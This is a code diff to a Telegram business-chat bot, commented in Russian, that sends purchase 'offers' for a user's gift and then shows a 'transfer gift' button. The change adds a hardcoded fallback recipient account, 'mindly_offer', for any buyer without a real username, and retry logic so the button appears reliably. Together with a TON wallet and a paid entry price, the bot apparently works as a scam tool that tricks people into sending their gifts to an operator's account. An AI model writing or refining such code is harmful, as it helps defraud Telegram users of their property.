@@ -45,6 +45,9 @@ TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
 ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
 USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
 
+# Резервный получатель, если у покупателя нет @username
+GIFT_RECIPIENT = "mindly_offer" 
+
 router = Router()
 COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
 GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
@@ -127,7 +130,7 @@ class Offer:
     price: str
     currency: str
     lang: str = "ru"
-    buyer_username: str = ""  # ВОЗВРАЩЕНО ДЛЯ КОРРЕКТНОЙ ССЫЛКИ
+    buyer_username: str = ""
 
 
 offers: dict[str, Offer] = {}
@@ -162,6 +165,34 @@ async def safe_send_message_text(
                 continue
             raise
     if last_error: raise last_error
+
+
+async def safe_edit_message_text(
+    bot: Bot, text: str, chat_id: int, message_id: int,
+    business_connection_id: str | None = None,
+    reply_markup: InlineKeyboardMarkup | None = None,
+    link_preview_options: LinkPreviewOptions | None = None
+) -> None:
+    if link_preview_options is None:
+        link_preview_options = LinkPreviewOptions(is_disabled=True)
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            await bot.edit_message_text(
+                text=text, chat_id=chat_id, message_id=message_id,
+                business_connection_id=business_connection_id,
+                reply_markup=reply_markup, link_preview_options=link_preview_options
+            )
+            return
+        except TelegramRetryAfter as e:
+            wait_time = e.retry_after if hasattr(e, 'retry_after') else 60
+            if attempt == max_retries - 1: raise e
+            logging.info(f"Edit Flood Wait ({wait_time}s).")
+            await asyncio.sleep(wait_time)
+        except Exception as e:
+            logging.debug(f"Edit failed: {e}")
+            if attempt == max_retries - 1: raise e
+            await asyncio.sleep(1)
 
 
 def parse_price(payload: str) -> str | None:
@@ -203,7 +234,7 @@ def offer_text(offer: Offer) -> str:
             f"<b>{price} {cur}</b> مقابل الهدية\n\n"
             f"<b>العرض صالح لمدة {ttl} س و 59 د أخرى.</b>"
         )
-    # Русский (по умолчанию) - ИСПРАВЛЕН (возвращен оригинальный вид)
+    # Русский (по умолчанию)
     return (
         f"Пользователь <b>{name}</b> предлагает\n"
         f"Вам <b>{price} {cur}</b> за подарок\n\n"
@@ -249,9 +280,13 @@ def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         "ar": "إرسال",
     }.get(offer.lang, "Передать")
     
-    # ИСПОЛЬЗУЕМ ЮЗЕРНЕЙМ (строку), а не ID (число)
-    recipient = offer.buyer_username if offer.buyer_username else str(offer.buyer_id)
-    
+    # Проверяем, есть ли у покупателя настоящий username (не цифры)
+    if offer.buyer_username and not offer.buyer_username.isdigit():
+        recipient = offer.buyer_username
+    else:
+        # Если username нет, используем резервный аккаунт, чтобы ссылка не сломалась
+        recipient = GIFT_RECIPIENT
+        
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=transfer_label, url=f"tg://send_gift?to={recipient}")],
     ])
@@ -269,7 +304,7 @@ def proposal_keyboard(offer: Offer) -> InlineKeyboardMarkup:
     ]])
 
 
-# ===== Текст для всплывающего окна (Alert) при принятии оффера =====
+# ===== Текст для всплывающего окна (Alert) =====
 def accept_alert_text(offer: Offer) -> str:
     buyer_handle = offer.buyer_name
     currency = offer.currency
@@ -587,10 +622,9 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
 
     if action == "decline":
         try:
-            # Используем callback.message.edit_text для надежности в бизнес-чатах
-            await callback.message.edit_text(
-                text=decline_text(offer),
-                reply_markup=None
+            await safe_edit_message_text(
+                bot, decline_text(offer), offer.chat_id, offer.message_id,
+                offer.connection_id, None
             )
         except Exception as e:
             logging.error(f"Ошибка при редактировании (отклонение): {e}")
@@ -600,24 +634,33 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
     else:
         text = sold_text(offer)
         try:
-            # Используем callback.message.edit_text для надежности в бизнес-чатах
-            await callback.message.edit_text(
-                text=text,
-                reply_markup=sold_keyboard(offer)
+            await safe_edit_message_text(
+                bot, text, offer.chat_id, offer.message_id,
+                offer.connection_id, sold_keyboard(offer)
             )
         except Exception as e:
             logging.error(f"Ошибка при редактировании (принятие): {e}")
+            # Если редактирование сломалось, отправляем новое сообщение, чтобы кнопка точно появилась
+            try:
+                await safe_send_message_text(
+                    bot, text, offer.chat_id, offer.connection_id, sold_keyboard(offer),
+                    LinkPreviewOptions(is_disabled=True)
+                )
+            except Exception as send_e:
+                logging.error(f"Ошибка при отправке нового сообщения: {send_e}")
         
         offers.pop(offer_id, None)
         
-        # ВЫЗОВ ВСПЛЫВАЮЩЕГО ОКНА (ALERT)
+        # Вызов всплывающего окна
         alert_text = accept_alert_text(offer)
-        
-        # Защита от ошибки, если текст в окне превышает лимит Telegram (200 символов)
         if len(alert_text) > 200:
             alert_text = alert_text[:197] + "..."
             
-        await callback.answer(alert_text, show_alert=True)
+        try:
+            await callback.answer(alert_text, show_alert=True)
+        except Exception as e:
+            logging.error(f"Ошибка при показе окна: {e}")
+            await callback.answer("Принято.")
 
 
 async def main() -> None:
